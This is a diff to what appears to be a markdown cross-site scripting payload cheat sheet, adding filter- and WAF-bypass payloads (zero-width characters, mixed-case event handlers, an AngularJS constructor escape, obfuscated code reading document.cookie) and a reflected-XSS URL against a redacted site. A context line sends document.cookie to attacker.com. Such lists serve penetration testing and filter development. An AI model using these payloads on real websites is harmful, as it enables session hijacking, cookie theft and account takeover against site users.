@@ -63,6 +63,18 @@ OnMoUsEoVeR=prompt(/hacked/)//
 /><svg src=x onload=confirm("1337");>
 &quot;&gt;&lt;img src=x onerror=confirm(document.domain);&gt;
 "mitsec<form/><!><details/open/ontoggle=alert(document.domain)>"@gmail.com
+"><body/oNpagEshoW​=(confirm)(document.domain)>
+<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS​=alert`1` //
+"><details/open/id="&XSS"ontoggle​=alert("XSS_WAF_BYPASS_:-)")>
+<img/src/onerror​=alert&#xFEFF;(1)>
+'"><svg><animate onbegin​=alert('hacked') attributeName=x></svg> 
+<a href=javascript​:alert('hacked')>Click Here</a>
+<IFRAME SRC="javascript​:alert('hacked');"></IFRAME>
+<div ng-app> <strong class="ng-init:constructor.constructor('alert('hacked')')()">aaa</strong> </div>
+<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS​=alert`hacked` //
+<noscript><p title="</noscript><img src=x onerror=([,O,B,J,E,C,,]=[]+{},[T,R,U,E,F,A,L,S,,,N]=[!!O]+!O+B.E)[X=C+O+N+S+T+R+U+C+T+O+R][X](A+L+E+R+T+(document.cookie))()>">
+%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
+
 ```
 ## XSS via Reflected Headers
 ```http
@@ -183,3 +195,10 @@ host+/_ignition/scripts/--%3E%3Csvg%20onload=alert('XSS')%3E
 ```js
 "><img src=x onerror=this.src=https://attacker.com/?+document.cookie;>
 ```
+
+## Reflected XSS
+
+```js
+https://REDACTED/subscribe?source=mllamazares%22%20accesskey=%22X%22%20onclick=%22alert(document.domain)%22/%3EPress%20Alt%2BShift%2BX%20to%20continue%20
+```
+
